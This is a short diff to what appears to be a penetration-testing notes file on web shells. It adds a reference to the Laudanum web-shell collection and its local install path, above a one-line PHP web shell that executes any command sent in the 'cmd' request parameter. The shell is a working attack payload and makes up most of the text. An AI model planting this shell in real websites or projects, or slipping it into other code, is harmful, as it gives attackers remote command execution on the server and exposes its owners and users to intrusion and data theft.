@@ -1,3 +1,4 @@
+Refer [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum) present in `/usr/share/laudanum`
 ```php
 <?php system($_REQUEST["cmd"]); ?>
 ```
